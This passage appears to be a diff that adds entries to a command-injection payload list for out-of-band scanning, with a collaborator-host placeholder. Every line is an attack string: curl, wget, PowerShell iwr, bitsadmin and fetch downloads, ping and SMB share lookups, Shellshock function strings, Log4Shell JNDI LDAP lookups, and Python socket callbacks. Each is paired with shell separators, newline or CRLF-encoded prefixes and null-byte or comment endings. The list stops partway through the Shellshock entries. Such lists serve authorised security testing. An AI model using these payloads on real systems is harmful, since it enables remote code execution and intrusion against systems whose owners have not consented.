+"iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt&&
+"iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt|
+"iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt||
+"iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt;
+"iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt%00
+"iwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt#
+"bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt&
+"bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt&&
+"bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt|
+"bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt||
+"bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt;
+"bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt%00
+"bitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt#
+"fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt&
+"fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt&&
+"fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt|
+"fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt||
+"fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt;
+"fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt%00
+"fetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt#
+"ping !-VARIABLE_COLLABORATOR-!&
+"ping !-VARIABLE_COLLABORATOR-!&&
+"ping !-VARIABLE_COLLABORATOR-!|
+"ping !-VARIABLE_COLLABORATOR-!||
+"ping !-VARIABLE_COLLABORATOR-!;
+"ping !-VARIABLE_COLLABORATOR-!%00
+"ping !-VARIABLE_COLLABORATOR-!#
+"\\!-VARIABLE_COLLABORATOR-!\share&
+"\\!-VARIABLE_COLLABORATOR-!\share&&
+"\\!-VARIABLE_COLLABORATOR-!\share|
+"\\!-VARIABLE_COLLABORATOR-!\share||
+"\\!-VARIABLE_COLLABORATOR-!\share;
+"\\!-VARIABLE_COLLABORATOR-!\share%00
+"\\!-VARIABLE_COLLABORATOR-!\share#
+"() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt&
+"() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt&&
+"() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt|
+"() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt||
+"() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt;
+"() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt%00
+"() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt#
+"() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt&
+"() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt&&
+"() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt|
+"() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt||
+"() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt;
+"() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt%00
+"() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt#
+"() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt&
+"() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt&&
+"() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt|
+"() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt||
+"() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt;
+"() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt%00
+"() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt#
+"() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt&
+"() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt&&
+"() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt|
+"() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt||
+"() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt;
+"() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt%00
+"() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt#
+"${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}&
+"${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}&&
+"${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}|
+"${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}||
+"${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a};
+"${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}%00
+"${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}#
+"${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}&
+"${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}&&
+"${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}|
+"${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}||
+"${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a};
+"${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}%00
+"${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}#
+"python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")'&
+"python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")'&&
+"python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")'|
+"python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")'||
+"python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")';
+"python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")'%00
+"python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")'#
+"import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")&
+"import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")&&
+"import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")|
+"import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")||
+"import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce");
+"import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")%00
+"import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")#
+\ncurl !-VARIABLE_COLLABORATOR-!/rce_curl.txt&
+\ncurl !-VARIABLE_COLLABORATOR-!/rce_curl.txt&&
+\ncurl !-VARIABLE_COLLABORATOR-!/rce_curl.txt|
+\ncurl !-VARIABLE_COLLABORATOR-!/rce_curl.txt||
+\ncurl !-VARIABLE_COLLABORATOR-!/rce_curl.txt;
+\ncurl !-VARIABLE_COLLABORATOR-!/rce_curl.txt%00
+\ncurl !-VARIABLE_COLLABORATOR-!/rce_curl.txt#
+\nwget !-VARIABLE_COLLABORATOR-!/rce_curl.txt&
+\nwget !-VARIABLE_COLLABORATOR-!/rce_curl.txt&&
+\nwget !-VARIABLE_COLLABORATOR-!/rce_curl.txt|
+\nwget !-VARIABLE_COLLABORATOR-!/rce_curl.txt||
+\nwget !-VARIABLE_COLLABORATOR-!/rce_curl.txt;
+\nwget !-VARIABLE_COLLABORATOR-!/rce_curl.txt%00
+\nwget !-VARIABLE_COLLABORATOR-!/rce_curl.txt#
+\niwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt&
+\niwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt&&
+\niwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt|
+\niwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt||
+\niwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt;
+\niwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt%00
+\niwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt#
+\nbitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt&
+\nbitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt&&
+\nbitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt|
+\nbitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt||
+\nbitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt;
+\nbitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt%00
+\nbitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt#
+\nfetch !-VARIABLE_COLLABORATOR-!/fetch.txt&
+\nfetch !-VARIABLE_COLLABORATOR-!/fetch.txt&&
+\nfetch !-VARIABLE_COLLABORATOR-!/fetch.txt|
+\nfetch !-VARIABLE_COLLABORATOR-!/fetch.txt||
+\nfetch !-VARIABLE_COLLABORATOR-!/fetch.txt;
+\nfetch !-VARIABLE_COLLABORATOR-!/fetch.txt%00
+\nfetch !-VARIABLE_COLLABORATOR-!/fetch.txt#
+\nping !-VARIABLE_COLLABORATOR-!&
+\nping !-VARIABLE_COLLABORATOR-!&&
+\nping !-VARIABLE_COLLABORATOR-!|
+\nping !-VARIABLE_COLLABORATOR-!||
+\nping !-VARIABLE_COLLABORATOR-!;
+\nping !-VARIABLE_COLLABORATOR-!%00
+\nping !-VARIABLE_COLLABORATOR-!#
+\ncurl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt&
+\ncurl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt&&
+\ncurl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt|
+\ncurl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt||
+\ncurl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt;
+\ncurl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt%00
+\ncurl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt#
+\nwget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt&
+\nwget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt&&
+\nwget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt|
+\nwget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt||
+\nwget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt;
+\nwget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt%00
+\nwget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt#
+\niwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt&
+\niwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt&&
+\niwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt|
+\niwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt||
+\niwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt;
+\niwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt%00
+\niwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt#
+\nbitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt&
+\nbitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt&&
+\nbitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt|
+\nbitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt||
+\nbitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt;
+\nbitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt%00
+\nbitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt#
+\nfetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt&
+\nfetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt&&
+\nfetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt|
+\nfetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt||
+\nfetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt;
+\nfetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt%00
+\nfetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt#
+\nping !-VARIABLE_COLLABORATOR-!&
+\nping !-VARIABLE_COLLABORATOR-!&&
+\nping !-VARIABLE_COLLABORATOR-!|
+\nping !-VARIABLE_COLLABORATOR-!||
+\nping !-VARIABLE_COLLABORATOR-!;
+\nping !-VARIABLE_COLLABORATOR-!%00
+\nping !-VARIABLE_COLLABORATOR-!#
+\n\\!-VARIABLE_COLLABORATOR-!\share&
+\n\\!-VARIABLE_COLLABORATOR-!\share&&
+\n\\!-VARIABLE_COLLABORATOR-!\share|
+\n\\!-VARIABLE_COLLABORATOR-!\share||
+\n\\!-VARIABLE_COLLABORATOR-!\share;
+\n\\!-VARIABLE_COLLABORATOR-!\share%00
+\n\\!-VARIABLE_COLLABORATOR-!\share#
+\n() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt&
+\n() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt&&
+\n() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt|
+\n() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt||
+\n() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt;
+\n() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt%00
+\n() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt#
+\n() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt&
+\n() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt&&
+\n() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt|
+\n() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt||
+\n() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt;
+\n() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt%00
+\n() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!:80/shellshock_curl.txt#
+\n() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt&
+\n() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt&&
+\n() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt|
+\n() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt||
+\n() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt;
+\n() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt%00
+\n() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!/shellshock_wget.txt#
+\n() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt&
+\n() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt&&
+\n() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt|
+\n() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt||
+\n() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt;
+\n() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt%00
+\n() { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt#
+\n${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}&
+\n${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}&&
+\n${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}|
+\n${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}||
+\n${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a};
+\n${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}%00
+\n${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}#
+\n${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}&
+\n${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}&&
+\n${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}|
+\n${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}||
+\n${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a};
+\n${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}%00
+\n${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}#
+\npython3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")'&
+\npython3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")'&&
+\npython3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")'|
+\npython3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")'||
+\npython3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")';
+\npython3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")'%00
+\npython3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")'#
+\nimport os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")&
+\nimport os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")&&
+\nimport os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")|
+\nimport os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")||
+\nimport os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce");
+\nimport os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")%00
+\nimport os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")#
+%0d%0acurl !-VARIABLE_COLLABORATOR-!/rce_curl.txt&
+%0d%0acurl !-VARIABLE_COLLABORATOR-!/rce_curl.txt&&
+%0d%0acurl !-VARIABLE_COLLABORATOR-!/rce_curl.txt|
+%0d%0acurl !-VARIABLE_COLLABORATOR-!/rce_curl.txt||
+%0d%0acurl !-VARIABLE_COLLABORATOR-!/rce_curl.txt;
+%0d%0acurl !-VARIABLE_COLLABORATOR-!/rce_curl.txt%00
+%0d%0acurl !-VARIABLE_COLLABORATOR-!/rce_curl.txt#
+%0d%0awget !-VARIABLE_COLLABORATOR-!/rce_curl.txt&
+%0d%0awget !-VARIABLE_COLLABORATOR-!/rce_curl.txt&&
+%0d%0awget !-VARIABLE_COLLABORATOR-!/rce_curl.txt|
+%0d%0awget !-VARIABLE_COLLABORATOR-!/rce_curl.txt||
+%0d%0awget !-VARIABLE_COLLABORATOR-!/rce_curl.txt;
+%0d%0awget !-VARIABLE_COLLABORATOR-!/rce_curl.txt%00
+%0d%0awget !-VARIABLE_COLLABORATOR-!/rce_curl.txt#
+%0d%0aiwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt&
+%0d%0aiwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt&&
+%0d%0aiwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt|
+%0d%0aiwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt||
+%0d%0aiwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt;
+%0d%0aiwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt%00
+%0d%0aiwr !-VARIABLE_COLLABORATOR-!/iwr.txt -OutFile iwr.txt#
+%0d%0abitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt&
+%0d%0abitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt&&
+%0d%0abitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt|
+%0d%0abitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt||
+%0d%0abitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt;
+%0d%0abitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt%00
+%0d%0abitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!/bitsadmin.txt %temp%\bitsadmin.txt#
+%0d%0afetch !-VARIABLE_COLLABORATOR-!/fetch.txt&
+%0d%0afetch !-VARIABLE_COLLABORATOR-!/fetch.txt&&
+%0d%0afetch !-VARIABLE_COLLABORATOR-!/fetch.txt|
+%0d%0afetch !-VARIABLE_COLLABORATOR-!/fetch.txt||
+%0d%0afetch !-VARIABLE_COLLABORATOR-!/fetch.txt;
+%0d%0afetch !-VARIABLE_COLLABORATOR-!/fetch.txt%00
+%0d%0afetch !-VARIABLE_COLLABORATOR-!/fetch.txt#
+%0d%0aping !-VARIABLE_COLLABORATOR-!&
+%0d%0aping !-VARIABLE_COLLABORATOR-!&&
+%0d%0aping !-VARIABLE_COLLABORATOR-!|
+%0d%0aping !-VARIABLE_COLLABORATOR-!||
+%0d%0aping !-VARIABLE_COLLABORATOR-!;
+%0d%0aping !-VARIABLE_COLLABORATOR-!%00
+%0d%0aping !-VARIABLE_COLLABORATOR-!#
+%0d%0acurl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt&
+%0d%0acurl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt&&
+%0d%0acurl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt|
+%0d%0acurl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt||
+%0d%0acurl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt;
+%0d%0acurl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt%00
+%0d%0acurl !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt#
+%0d%0awget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt&
+%0d%0awget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt&&
+%0d%0awget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt|
+%0d%0awget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt||
+%0d%0awget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt;
+%0d%0awget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt%00
+%0d%0awget !-VARIABLE_COLLABORATOR-!:80/rce_curl.txt#
+%0d%0aiwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt&
+%0d%0aiwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt&&
+%0d%0aiwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt|
+%0d%0aiwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt||
+%0d%0aiwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt;
+%0d%0aiwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt%00
+%0d%0aiwr !-VARIABLE_COLLABORATOR-!:80/iwr.txt -OutFile iwr.txt#
+%0d%0abitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt&
+%0d%0abitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt&&
+%0d%0abitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt|
+%0d%0abitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt||
+%0d%0abitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt;
+%0d%0abitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt%00
+%0d%0abitsadmin /transfer oob_test /priority high !-VARIABLE_COLLABORATOR-!:80/bitsadmin.txt %temp%\bitsadmin.txt#
+%0d%0afetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt&
+%0d%0afetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt&&
+%0d%0afetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt|
+%0d%0afetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt||
+%0d%0afetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt;
+%0d%0afetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt%00
+%0d%0afetch !-VARIABLE_COLLABORATOR-!:80/fetch.txt#
+%0d%0aping !-VARIABLE_COLLABORATOR-!&
+%0d%0aping !-VARIABLE_COLLABORATOR-!&&
+%0d%0aping !-VARIABLE_COLLABORATOR-!|
+%0d%0aping !-VARIABLE_COLLABORATOR-!||
+%0d%0aping !-VARIABLE_COLLABORATOR-!;
+%0d%0aping !-VARIABLE_COLLABORATOR-!%00
+%0d%0aping !-VARIABLE_COLLABORATOR-!#
+%0d%0a\\!-VARIABLE_COLLABORATOR-!\share&
+%0d%0a\\!-VARIABLE_COLLABORATOR-!\share&&
+%0d%0a\\!-VARIABLE_COLLABORATOR-!\share|
+%0d%0a\\!-VARIABLE_COLLABORATOR-!\share||
+%0d%0a\\!-VARIABLE_COLLABORATOR-!\share;
+%0d%0a\\!-VARIABLE_COLLABORATOR-!\share%00
+%0d%0a\\!-VARIABLE_COLLABORATOR-!\share#
+%0d%0a() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt&
+%0d%0a() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt&&
+%0d%0a() { :;}; /bin/bash -c "wget !-VARIABLE_COLLABORATOR-!:80/shellshock_wget.txt|
